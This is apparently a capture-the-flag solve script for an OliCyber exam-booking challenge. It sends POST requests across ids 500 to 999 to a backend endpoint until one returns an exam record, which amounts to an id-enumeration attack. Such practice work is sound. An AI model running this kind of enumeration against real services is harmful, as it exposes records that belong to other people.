import requests

for i in range(500, 1000):
	# removed useless parameters
	data = {
				"id_verbale":i,
				"cod_ins":"01ELEET",
				"data_appello":"2021-07-05",
				"docente":"ROBOT MR",
		   }
	r = requests.post('http://exambooking.challs.olicyber.it/bakand', json=data, verify=False).text
	if 'No exam' in r:
		print("No Exam Found With Id {}".format(i))
		continue
	print(r, i)
	break
